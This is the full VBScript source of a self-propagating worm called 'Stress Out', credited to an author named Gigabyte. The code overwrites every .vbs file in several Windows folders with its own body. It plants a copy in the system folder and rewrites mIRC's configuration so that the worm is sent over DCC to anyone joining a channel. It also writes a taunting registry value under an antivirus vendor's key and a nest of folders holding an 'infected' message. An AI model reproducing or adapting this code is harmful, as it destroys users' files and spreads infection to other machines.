' VBS worm/virus: Stress Out
' Author: Gigabyte [Kefrens]

On Error Resume Next
dim worm, Map, virus, f, b, Fool, a, fc, nf, fso, d

Const ForReading = 1, ForWriting = 2, ForAppending = 8

Set worm = CreateObject("Scripting.FileSystemObject")
Set w = worm.GetFile(WScript.ScriptFullName)
w.Copy ("c:\windows\system\wscript.vbs")
Set f = worm.OpenTextFile(WScript.ScriptFullName, 1)
wormcopy =  f.ReadAll

Set Map = worm.GetFolder("c:\")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set Map = worm.GetFolder("c:\My Documents")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set Map = worm.GetFolder("c:\Windows")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set fso = CreateObject("Scripting.FileSystemObject")
Set b = fso.CreateTextFile("c:\mirc\script.ini", True)
b.WriteLine "[script]"
b.WriteLine "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
b.WriteLine "n1=/dcc send $nick c:\windows\system\wscript.vbs"
b.WriteLine "}"
b.close

Set f = fso.OpenTextFile("c:\mirc\mirc.ini", 8, True)
f.WriteLine "n3=c:\mirc\script.ini"
f.Close

Set Regedit = CreateObject("WScript.Shell")
Regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\KasperskyLab\AVP32\VX Rules", "Stress Out"


Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\")
Set fc = a.SubFolders
Set nf = fc.Add("VX Rules")

Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\VX Rules\")
Set fc = a.SubFolders
Set nf = fc.Add("Fuck AV")

    
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\VX Rules\Fuck AV\")
Set fc = a.SubFolders
Set nf = fc.Add("Yes I am serious")

Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\VX Rules\Fuck AV\Yes I am serious\")
Set fc = a.SubFolders
Set nf = fc.Add("You think this is a joke")

Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\VX Rules\Fuck AV\Yes I am serious\You think this is a joke\")
Set fc = a.SubFolders
Set nf = fc.Add("Ah fuck you")

Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\VX Rules\Fuck AV\Yes I am serious\You think this is a joke\Ah fuck you\")
Set fc = a.SubFolders
Set nf = fc.Add("No not in the sexual way")

Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\VX Rules\Fuck AV\Yes I am serious\You think this is a joke\Ah fuck you\No not in the sexual way\")
Set fc = a.SubFolders
Set nf = fc.Add("You are infected")

Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\VX Rules\Fuck AV\Yes I am serious\You think this is a joke\Ah fuck you\No not in the sexual way\You are infected\")
Set fc = a.SubFolders
Set nf = fc.Add("If you are stressed now")

Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\VX Rules\Fuck AV\Yes I am serious\You think this is a joke\Ah fuck you\No not in the sexual way\You are infected\If you are stressed now\")
Set fc = a.SubFolders
Set nf = fc.Add("Stress out and relax")


Set Fool = CreateObject("Scripting.FileSystemObject")
Set d = Fool.CreateTextFile("c:\VX Rules\Fuck AV\Yes I am serious\You think this is a joke\Ah fuck you\No not in the sexual way\You are infected\If you are stressed now\Stress out and relax\And go to hell.txt", True)
d.WriteLine("You're infected with Stress Out..Have a stressed day..Gigabyte")
d.close